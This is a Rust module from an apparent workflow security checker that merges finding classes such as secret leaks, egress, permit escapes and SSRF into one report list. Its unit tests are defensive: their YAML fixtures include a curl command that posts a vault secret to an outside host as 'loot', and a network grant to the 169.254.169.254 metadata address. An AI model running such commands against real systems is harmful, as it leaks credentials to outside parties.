// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2024-2026 SuperNovae Studio <contact@supernovae.studio>

//! The UNIFIED findings list (#331) — every finding class, one shape,
//! one loop.
//!
//! A failing report scatters findings across ten sibling keys and only
//! `clean: bool` aggregates — a consumer had to hardcode the key list,
//! and a new class broke every consumer SILENTLY. `findings[]` is the
//! aggregation: the per-class keys stay (the typed surface), this is
//! the renderable one. The completeness ratchet lives in this module's
//! tests: `is_clean() ⇔ findings().is_empty()` is asserted per class,
//! so an eleventh finding class that forgets to join the fold turns a
//! test red instead of a consumer blind.

use serde::Serialize;

use super::ByteSpan;
use super::{CheckReport, FindingSeverity};

/// One finding, class-erased: the stable discriminator is [`Self::kind`]
/// (a closed slug set — additive only), the ladder section is
/// [`Self::gate`] (the same grep-stable keyword the human render
/// prints), and `code`/`docs_url` ride ONLY when a canonical spec code
/// exists for the class (the analysis-native classes are report-only by
/// design — a conjured code would 404).
#[derive(Debug, Clone, Serialize)]
#[non_exhaustive]
pub struct UnifiedFinding {
    /// The class slug (`conformance` · `secret_leak` · `secret_egress` ·
    /// `capability_escape` · `permit_taint` · `policy` · `schema_type` ·
    /// `gate` · `unknown_tool` · `unknown_arg` · `missing_arg` ·
    /// `schema_lint`).
    pub kind: &'static str,
    /// The ladder section the human render files this under.
    pub gate: &'static str,
    /// Engine-stamped severity (every class is a run-blocker today).
    pub severity: FindingSeverity,
    /// The canonical spec code, when the class carries one.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub code: Option<String>,
    /// The per-code docs page (rides with `code`).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub docs_url: Option<String>,
    /// The human row — same wording family as the rendered report.
    pub message: String,
    /// The offending task, when the finding names one.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub task: Option<String>,
    /// The source byte range, when the finding carries one.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub span: Option<ByteSpan>,
}

impl UnifiedFinding {
    fn new(kind: &'static str, gate: &'static str, message: String) -> Self {
        Self {
            kind,
            gate,
            severity: FindingSeverity::Error,
            code: None,
            docs_url: None,
            message,
            task: None,
            span: None,
        }
    }
}

/// The composition fold (spec 14) — split out of [`collect`] at the
/// 100-line cap (the `fold_tools` precedent).
fn fold_composition(report: &CheckReport, out: &mut Vec<UnifiedFinding>) {
    for c in &report.composition {
        // spec 14 — the row already names task · target · law · repair.
        let mut f = UnifiedFinding::new(
            "composition",
            "COMPOSITION",
            format!("{} → `{}` — {}", c.task, c.target, c.detail),
        );
        f.code = Some(c.code.to_owned());
        f.docs_url = Some(format!("{}/{}", super::ERROR_DOCS_BASE, c.code));
        f.task = Some(c.task.clone());
        f.span = Some(c.span);
        out.push(f);
    }
}

/// Fold every class into the one list — conformance first (the ladder's
/// own order), then the analysis classes in render order.
pub(super) fn collect(report: &CheckReport) -> Vec<UnifiedFinding> {
    let mut out = Vec::new();
    for c in &report.conformance {
        let mut f = UnifiedFinding::new("conformance", "CONFORM", c.message.clone());
        f.code = Some(c.code.clone());
        f.docs_url = Some(c.docs_url.clone());
        f.span = c.span;
        out.push(f);
    }
    for l in &report.secret_leaks {
        // The fix is a per-sink sanction ON THE SECRET — spelled out so the
        // flagship IFC finding is self-serve (the author no longer reads
        // spec 01 §egress to derive it · use-case battery 2026-07-11 · T2).
        let mut f = UnifiedFinding::new(
            "secret_leak",
            "SECRETS",
            format!(
                "leak into {} (task `{}`) — {} · fix: sanction it — \
                 `egress: [{{ to: \"{}\" }}]` on `secrets.{}`",
                l.sink, l.task, l.trace, l.sink_id, l.secret
            ),
        );
        // W4 (spec 10): the flow refusal carries its wire code — the
        // message keeps the TaintTrace verbatim (it IS the witness).
        f.code = Some("NIKA-SEC-006".to_owned());
        f.docs_url = Some(format!("{}/NIKA-SEC-006", super::ERROR_DOCS_BASE));
        f.task = Some(l.task.clone());
        out.push(f);
    }
    for e in &report.secret_egresses {
        let mut f = UnifiedFinding::new(
            "secret_egress",
            "SECRETS",
            format!("EGRESS via outputs.{} — {}", e.output, e.trace),
        );
        // NIKA-SEC-007 — a tainted value reaches the workflow boundary.
        f.code = Some("NIKA-SEC-007".to_owned());
        f.docs_url = Some(format!("{}/NIKA-SEC-007", super::ERROR_DOCS_BASE));
        out.push(f);
    }
    for c in &report.capability_escapes {
        let mut f = UnifiedFinding::new(
            "capability_escape",
            "PERMITS",
            match &c.fix {
                Some(fix) => format!("{} (task `{}`) — fix: {}", c.detail, c.task, fix),
                None => format!("{} (task `{}`)", c.detail, c.task),
            },
        );
        // The wire code the RUN would emit for the same violation: the
        // always-on SSRF floor speaks NIKA-SEC-005, an effect judged
        // against the F-O8 zero boundary (no `permits:` declared) speaks
        // NIKA-AUTH-006, the declared permits boundary NIKA-SEC-004
        // (spec 05-errors) — check≡run down to the code.
        let code = if c.floor {
            "NIKA-SEC-005"
        } else if c.undeclared {
            "NIKA-AUTH-006"
        } else {
            "NIKA-SEC-004"
        };
        f.code = Some(code.to_owned());
        f.docs_url = Some(format!("{}/{code}", super::ERROR_DOCS_BASE));
        f.task = Some(c.task.clone());
        out.push(f);
    }
    fold_permit_taints(report, &mut out);
    fold_sink_findings(report, &mut out);
    for p in &report.policy_findings {
        // spec 10 — the detail already names rule + task + witness.
        let mut f = UnifiedFinding::new("policy", "POLICY", p.detail.clone());
        f.code = Some("NIKA-POLICY-001".to_owned());
        f.docs_url = Some(format!("{}/NIKA-POLICY-001", super::ERROR_DOCS_BASE));
        f.task.clone_from(&p.task);
        out.push(f);
    }
    fold_trifecta(report, &mut out);
    for s in &report.schema_findings {
        out.push(UnifiedFinding::new(
            "schema_type",
            "TYPES",
            format!("{} — {} ({})", s.reference, s.detail, s.site),
        ));
    }
    for g in &report.gate_findings {
        let mut f = UnifiedFinding::new(
            "gate",
            "GATES",
            match &g.fix {
                Some(fix) => format!("{} (task `{}`) — fix: {}", g.detail, g.task, fix),
                None => format!("{} (task `{}`)", g.detail, g.task),
            },
        );
        // The wire code (DAG-006 statically dead · DAG-007 bad status
        // literal — spec 05-errors) · one-voice: the refusal names it.
        let code = g.kind.wire_code();
        f.code = Some(code.to_owned());
        f.docs_url = Some(format!("{}/{code}", super::ERROR_DOCS_BASE));
        f.task = Some(g.task.clone());
        f.span = g.span;
        out.push(f);
    }
    fold_composition(report, &mut out);
    fold_tools(report, &mut out);
    for l in &report.schema_lints {
        let mut f = UnifiedFinding::new(
            "schema_lint",
            "SCHEMA",
            format!("{} — {} (task `{}`)", l.path, l.detail, l.task),
        );
        f.task = Some(l.task.clone());
        out.push(f);
    }
    out
}

/// The permit-taint class (NEP-0004 · the check-time twin of the runtime
/// re-gate) — the wire code is the finding's own kind (law 1 →
/// NIKA-AUTH-007 · law 2 → NIKA-AUTH-008 · ONE match arm, every surface).
fn fold_permit_taints(report: &CheckReport, out: &mut Vec<UnifiedFinding>) {
    for t in &report.permit_taints {
        let mut f = UnifiedFinding::new(
            "permit_taint",
            "PERMITS",
            match &t.fix {
                Some(fix) => format!("{} (task `{}`) — fix: {}", t.detail, t.task, fix),
                None => format!("{} (task `{}`)", t.detail, t.task),
            },
        );
        let code = t.wire_code();
        f.code = Some(code.to_owned());
        f.docs_url = Some(format!("{}/{code}", super::ERROR_DOCS_BASE));
        f.task = Some(t.task.clone());
        out.push(f);
    }
}

/// The data-as-code sink class (NEP-0006 · NIKA-SEC-008) — the detail
/// names the class + extension, the fix carries both repairs.
fn fold_sink_findings(report: &CheckReport, out: &mut Vec<UnifiedFinding>) {
    for s in &report.sink_findings {
        let mut f = UnifiedFinding::new(
            "data_sink",
            "PERMITS",
            format!("{} (task `{}`) — fix: {}", s.detail, s.task, s.fix),
        );
        let code = s.wire_code();
        f.code = Some(code.to_owned());
        f.docs_url = Some(format!("{}/{code}", super::ERROR_DOCS_BASE));
        f.task = Some(s.task.clone());
        out.push(f);
    }
}

/// The lethal-trifecta class (NEP-0002 · NIKA-SEC-009) — the detail opens
/// with the NEP's verbatim message and names the ungated egress task (the
/// witness).
fn fold_trifecta(report: &CheckReport, out: &mut Vec<UnifiedFinding>) {
    for t in &report.trifecta_findings {
        let mut f = UnifiedFinding::new("trifecta", "TRIFECTA", t.detail.clone());
        f.code = Some("NIKA-SEC-009".to_owned());
        f.docs_url = Some(format!("{}/NIKA-SEC-009", super::ERROR_DOCS_BASE));
        f.task = Some(t.task.clone());
        out.push(f);
    }
}

/// The three tool-contract classes (all BUILTIN-coded, TOOLS/ARGS gates).
fn fold_tools(report: &CheckReport, out: &mut Vec<UnifiedFinding>) {
    let builtin_code = || Some("NIKA-BUILTIN-001".to_owned());
    let builtin_url = || Some(format!("{}/NIKA-BUILTIN-001", super::ERROR_DOCS_BASE));
    for t in &report.unknown_tools {
        let mut f = UnifiedFinding::new(
            "unknown_tool",
            "TOOLS",
            match &t.suggestion {
                Some(s) => format!(
                    "`{}` names no canonical builtin (task `{}`) — did you mean `{s}`?",
                    t.tool, t.task
                ),
                None => format!(
                    "`{}` names no canonical builtin (task `{}`)",
                    t.tool, t.task
                ),
            },
        );
        f.code = builtin_code();
        f.docs_url = builtin_url();
        f.task = Some(t.task.clone());
        out.push(f);
    }
    for a in &report.unknown_args {
        let mut f = UnifiedFinding::new(
            "unknown_arg",
            "ARGS",
            match &a.suggestion {
                Some(s) => format!(
                    "`{}` is not an arg of `{}` (task `{}`) — did you mean `{s}`?",
                    a.arg, a.tool, a.task
                ),
                // No honest guess (a wrong-name-entirely miss) — the
                // closed declared set IS the teaching.
                None => format!(
                    "`{}` is not an arg of `{}` (task `{}`) — declared: {}",
                    a.arg,
                    a.tool,
                    a.task,
                    a.declared.join(" · ")
                ),
            },
        );
        f.code = builtin_code();
        f.docs_url = builtin_url();
        f.task = Some(a.task.clone());
        out.push(f);
    }
    for m in &report.missing_args {
        let mut f = UnifiedFinding::new(
            "missing_arg",
            "ARGS",
            format!("`{}` requires arg `{}` (task `{}`)", m.tool, m.arg, m.task),
        );
        f.code = builtin_code();
        f.docs_url = builtin_url();
        f.task = Some(m.task.clone());
        out.push(f);
    }
}

#[cfg(test)]
mod tests {
    use nika_schema::parser::{ParseMode, parse};
    use nika_schema::source::FileId;

    fn report(yaml: &str) -> crate::CheckReport {
        crate::check(&parse(yaml, FileId::new(0), ParseMode::Strict).expect("fixture parses"))
    }

    /// THE completeness ratchet: `is_clean()` and `findings.is_empty()`
    /// are the same statement — a new finding class that updates
    /// `is_clean` but forgets the fold turns this red (per-class
    /// fixtures below make the direction concrete).
    #[test]
    fn clean_report_has_zero_findings() {
        let r = report(
            "nika: v1\nworkflow:\n  id: ok\npermits: { exec: [\"echo\"] }\ntasks:\n  a:\n    exec: { command: [\"echo\", \"x\"] }\n",
        );
        assert!(r.is_clean());
        assert!(r.findings.is_empty(), "{:#?}", r.findings);
    }

    /// Per-class: every dirty fixture must surface in findings[] AND
    /// flip `is_clean` — the equivalence, exercised from the dirty side.
    #[test]
    fn each_dirty_class_lands_in_findings_with_its_gate() {
        let cases: Vec<(&str, &str, &str)> = vec![
            (
                // conformance: unresolved reference
                "nika: v1\nworkflow:\n  id: w\ntasks:\n  a:\n    infer: { prompt: \"${{ tasks.ghost.output }}\", max_tokens: 9 }\n",
                "conformance",
                "CONFORM",
            ),
            (
                // capability escape: exec outside a declared boundary
                "nika: v1\nworkflow:\n  id: w\npermits: { exec: false }\ntasks:\n  a:\n    exec: { command: [\"cargo\", \"x\"] }\n",
                "capability_escape",
                "PERMITS",
            ),
            (
                // unknown tool (typo'd builtin)
                "nika: v1\nworkflow:\n  id: w\ntasks:\n  a:\n    invoke: { tool: \"nika:raed\", args: { path: \"./x\" } }\n",
                "unknown_tool",
                "TOOLS",
            ),
            (
                // missing required arg
                "nika: v1\nworkflow:\n  id: w\ntasks:\n  a:\n    invoke: { tool: \"nika:write\", args: { path: \"./x\" } }\n",
                "missing_arg",
                "ARGS",
            ),
            (
                // composition: a templated child target (the PURE half of
                // the spec-14 lane — fires in every check(), reader-less)
                "nika: v1\nworkflow:\n  id: w\nconst:\n  v: \"a\"\ntasks:\n  a:\n    invoke: { workflow: \"./x-${{ const.v }}.nika.yaml\" }\n",
                "composition",
                "COMPOSITION",
            ),
            (
                // trifecta: all three legs declared + an ungated egress the
                // untrusted content REACHES (NEP-0002 v2.0 · the second
                // fetch's url rides the first's untrusted output)
                "nika: v1\nworkflow:\n  id: w\npermits:\n  fs: { read: [\"./inbox/**\"] }\n  net: { http: [\"api.example.com\"] }\n  tools: [\"nika:fetch\"]\ntasks:\n  a:\n    invoke:\n      tool: \"nika:fetch\"\n      args: { url: \"https://api.example.com/x\" }\n  b:\n    with: { d: \"${{ tasks.a.output }}\" }\n    invoke:\n      tool: \"nika:fetch\"\n      args: { url: \"https://api.example.com/${{ with.d }}\" }\n",
                "trifecta",
                "TRIFECTA",
            ),
        ];
        for (yaml, kind, gate) in cases {
            let r = report(yaml);
            assert!(!r.is_clean(), "fixture must be dirty for {kind}");
            let hit = r
                .findings
                .iter()
                .find(|f| f.kind == kind)
                .unwrap_or_else(|| panic!("{kind} missing from findings: {:#?}", r.findings));
            assert_eq!(hit.gate, gate);
        }
    }

    /// The canonical-code law: conformance + escapes + secret-flow +
    /// policy + tool-contract classes carry a code AND its docs url;
    /// analysis-native classes carry neither (a conjured code would 404).
    /// W4: the two flow refusals were report-only until the canon
    /// registered NIKA-SEC-006/007 (spec 10 §secret flow refusals).
    #[test]
    fn codes_ride_only_where_canonical() {
        let r = report(
            "nika: v1\nworkflow:\n  id: w\npermits: { exec: false }\ntasks:\n  a:\n    exec: { command: [\"cargo\", \"x\"] }\n",
        );
        let escape = r
            .findings
            .iter()
            .find(|f| f.kind == "capability_escape")
            .expect("escape");
        assert_eq!(escape.code.as_deref(), Some("NIKA-SEC-004"));
        assert_eq!(
            escape.docs_url.as_deref(),
            Some("https://nika.sh/errors/NIKA-SEC-004")
        );
        assert_eq!(escape.task.as_deref(), Some("a"));

        // secret_leak → NIKA-SEC-006 · secret_egress → NIKA-SEC-007 —
        // the message keeps the taint trace verbatim (it IS the witness).
        let r = report(
            "nika: v1\nworkflow:\n  id: w\nsecrets:\n  k: { source: vault, key: x }\ntasks:\n  a:\n    exec: { command: [\"curl\", \"-d\", \"${{ secrets.k }}\", \"https://x.test\"] }\noutputs:\n  loot: ${{ secrets.k }}\n",
        );
        let leak = r
            .findings
            .iter()
            .find(|f| f.kind == "secret_leak")
            .expect("leak");
        assert_eq!(leak.code.as_deref(), Some("NIKA-SEC-006"));
        assert_eq!(
            leak.docs_url.as_deref(),
            Some("https://nika.sh/errors/NIKA-SEC-006")
        );
        assert!(
            leak.message.contains("secrets.k"),
            "the taint trace stays the witness: {}",
            leak.message
        );
        let egress = r
            .findings
            .iter()
            .find(|f| f.kind == "secret_egress")
            .expect("egress");
        assert_eq!(egress.code.as_deref(), Some("NIKA-SEC-007"));
        assert_eq!(
            egress.docs_url.as_deref(),
            Some("https://nika.sh/errors/NIKA-SEC-007")
        );

        // policy → NIKA-POLICY-001 (spec 10).
        let r = report(
            "nika: v1\nworkflow:\n  id: w\npolicy:\n  limits: { max_tasks: 1 }\ntasks:\n  a:\n    infer: { prompt: \"x\" }\n  b:\n    infer: { prompt: \"y\" }\n",
        );
        let policy = r
            .findings
            .iter()
            .find(|f| f.kind == "policy")
            .expect("policy row");
        assert_eq!(policy.code.as_deref(), Some("NIKA-POLICY-001"));
        assert_eq!(policy.gate, "POLICY");

        // trifecta → NIKA-SEC-009 (NEP-0002) — the code rides with the
        // witness task (the SINK the content reaches · v2.0), one voice
        // with the conformance-code surface.
        let r = report(
            "nika: v1\nworkflow:\n  id: w\npermits:\n  fs: { read: [\"./inbox/**\"] }\n  net: { http: [\"api.example.com\"] }\n  tools: [\"nika:fetch\"]\ntasks:\n  a:\n    invoke:\n      tool: \"nika:fetch\"\n      args: { url: \"https://api.example.com/x\" }\n  b:\n    with: { d: \"${{ tasks.a.output }}\" }\n    invoke:\n      tool: \"nika:fetch\"\n      args: { url: \"https://api.example.com/${{ with.d }}\" }\n",
        );
        let tri = r
            .findings
            .iter()
            .find(|f| f.kind == "trifecta")
            .expect("trifecta row");
        assert_eq!(tri.code.as_deref(), Some("NIKA-SEC-009"));
        assert_eq!(
            tri.docs_url.as_deref(),
            Some("https://nika.sh/errors/NIKA-SEC-009")
        );
        assert_eq!(tri.task.as_deref(), Some("b"), "the sink is the witness");
    }

    /// The wire shape: absent optionals are ABSENT (never null) — the
    /// consumer's loop reads {kind, gate, severity, message} on every
    /// row and the rest only when present.
    #[test]
    fn serialization_skips_absent_optionals() {
        let r = report(
            "nika: v1\nworkflow:\n  id: w\ntasks:\n  a:\n    infer: { prompt: \"${{ tasks.ghost.output }}\", max_tokens: 9 }\n",
        );
        let json = serde_json::to_value(&r.findings).expect("serializes");
        let row = &json[0];
        assert_eq!(row["kind"], "conformance");
        assert_eq!(row["severity"], "error");
        assert!(row.get("task").is_none(), "absent, not null: {row}");
        assert!(row.get("code").is_some());
    }

    /// F-P5 (c) · the `*.` wildcard in `permits.net.http` is a hard
    /// refusal at check — the finding lands in findings[] with its wire
    /// code (NIKA-AUTH-010) so the run gate blocks on it.
    #[test]
    fn a_wildcard_net_http_entry_is_an_error_finding() {
        let r = report(
            "nika: v1\nworkflow:\n  id: w\npermits:\n  net: { http: [\"*.github.com\"] }\n  tools: [\"nika:fetch\"]\ntasks:\n  t:\n    invoke: { tool: \"nika:fetch\", args: { url: \"https://api.github.com/x\" } }\n",
        );
        assert!(!r.is_clean(), "the wildcard is a run-blocker");
        let hit = r
            .findings
            .iter()
            .find(|f| f.kind == "permit_taint")
            .expect("the wildcard finding");
        assert_eq!(hit.code.as_deref(), Some("NIKA-AUTH-010"));
        assert_eq!(hit.severity, super::FindingSeverity::Error);
        assert!(hit.message.contains("net.http[0]"), "{}", hit.message);
    }

    /// F-P5 (d) · the dead-grant twin of NIKA-AUTH-009 (env): a
    /// floor-blocked `permits.net.http` entry is an inert grant — flagged
    /// at the ENTRY with the floor code (check≡run down to the code: the
    /// run refuses the same target with NIKA-SEC-005).
    #[test]
    fn a_floor_blocked_net_http_entry_is_a_dead_grant_finding() {
        let r = report(
            "nika: v1\nworkflow:\n  id: w\npermits:\n  net: { http: [\"169.254.169.254\", \"api.x.com\"] }\n  tools: [\"nika:fetch\"]\ntasks:\n  t:\n    invoke: { tool: \"nika:fetch\", args: { url: \"https://api.x.com/x\" } }\n",
        );
        assert!(!r.is_clean());
        let hit = r
            .findings
            .iter()
            .find(|f| f.kind == "capability_escape" && f.task.as_deref() == Some("permits"))
            .expect("the dead-grant entry finding");
        assert_eq!(hit.code.as_deref(), Some("NIKA-SEC-005"));
        assert!(hit.message.contains("169.254.169.254"), "{}", hit.message);
        assert!(
            hit.message.contains("can never take effect"),
            "the dead-grant teaching: {}",
            hit.message
        );
    }
}
